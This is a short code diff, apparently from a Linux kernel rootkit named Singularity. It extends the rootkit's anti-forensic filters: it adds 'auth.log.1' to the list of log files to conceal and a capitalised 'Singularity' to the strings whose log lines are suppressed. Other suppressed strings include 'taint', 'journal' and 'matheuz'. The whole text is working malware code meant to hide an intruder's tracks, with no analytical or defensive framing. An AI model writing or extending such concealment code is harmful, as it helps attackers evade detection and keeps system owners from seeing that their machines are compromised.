@@ -22,6 +22,7 @@ notrace static bool should_filter_file(const char *filename) {
             strcmp(filename, "kern.log.1") == 0 ||
             strcmp(filename, "syslog") == 0 ||
             strcmp(filename, "auth.log") == 0 ||
+            strcmp(filename, "auth.log.1") == 0 ||
             strcmp(filename, "vmallocinfo") == 0 ||
             strcmp(filename, "syslog.1") == 0 ||
             strcmp(filename, "touched_functions") == 0);
@@ -39,6 +40,7 @@ notrace static bool line_contains_sensitive_info(const char *line) {
     return (strstr(line, "taint") != NULL ||
             strstr(line, "journal") != NULL ||
             strstr(line, "singularity") != NULL ||
+            strstr(line, "Singularity") != NULL ||
             strstr(line, "matheuz") != NULL ||
             strstr(line, "zer0t") != NULL ||
             strstr(line, "jira") != NULL ||
